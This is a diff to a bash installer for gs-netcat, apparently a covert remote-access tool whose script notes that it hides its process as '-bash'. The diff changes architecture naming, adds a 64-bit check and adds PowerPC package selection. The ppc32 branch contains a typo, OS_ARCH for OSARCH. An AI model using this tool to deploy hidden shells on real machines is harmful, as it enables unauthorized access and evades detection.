@@ -29,7 +29,7 @@
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install gsocket
-# GS_OSARCH=x86_64-alpine
+# GS_OSARCH=linux-x86_64
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
@@ -619,6 +619,14 @@ is_le()
 	return 255
 }
 
+# Return 0 (TRUE) if it is 64 bit arch. Default is FALSE (32bit)
+is_64bit() {
+	command -v getconf >/dev/null && [[ "$(getconf LONG_BIT)" == "64" ]] && return 0
+	command -v lscpu >/dev/null && [[ "$(lscpu)" == *"64-bit"* ]] && return 0
+	command -v uname >/dev/null && [[ "$(uname -m)" == *"64"* ]] && return 0
+	return 255		
+}
+
 init_vars()
 {
 	# Select binary
@@ -660,7 +668,7 @@ init_vars()
 	if [[ -z "$OSARCH" ]]; then
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
-				OSARCH="i386-alpine"
+				OSARCH="i386-linux"
 				SRC_PKG="gs-netcat_mini-linux-i686"
 			elif [[ "$arch" == *"armv6"* ]]; then
 				OSARCH="arm-linux"
@@ -675,20 +683,36 @@ init_vars()
 				OSARCH="aarch64-linux"
 				SRC_PKG="gs-netcat_mini-linux-aarch64"
 			elif [[ "$arch" == "mips64" ]]; then
-				OSARCH="mips64-alpine"
+				OSARCH="mips64-linux"
 				SRC_PKG="gs-netcat_mini-linux-mips64"
 				# Go 32-bit if Little Endian even if 64bit arch
 				is_le && {
-					OSARCH="mipsel32-alpine"
+					OSARCH="mipsel32-linux"
 					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
 			elif [[ "$arch" == *mips* ]]; then
-				OSARCH="mips32-alpine"
+				OSARCH="mips32-linux"
 				SRC_PKG="gs-netcat_mini-linux-mips32"
 				is_le && {
-					OSARCH="mipsel32-alpine"
+					OSARCH="mipsel32-linux"
 					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
+			elif [[ "$arch" == *"ppc"* ]]; then
+				if is_64bit; then
+					OSARCH="ppc64-linux"
+					SRC_PKG="gs-netcat_mini-linux-ppc64"
+					is_le && {
+						OSARCH="ppc64le-linux"
+						SRC_PKG="gs-netcat_mini-linux-ppc64le"
+					}
+				else
+					OS_ARCH="ppc32-linux"
+					SRC_PKG="gs-netcat_mini-linux-ppc32"
+					is_le && {
+						OSARCH="ppc32le-linux"
+						SRC_PKG="gs-netcat_mini-linux-ppc32le"
+					}
+				fi
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
@@ -715,7 +739,7 @@ init_vars()
 
 		[[ -z "$OSARCH" ]] && {
 			# Default: Try Alpine(muscl libc) 64bit
-			OSARCH="x86_64-alpine"
+			OSARCH="x86_64-linux"
 			SRC_PKG="gs-netcat_mini-linux-x86_64"
 		}
 	fi
@@ -728,7 +752,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_mini-${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
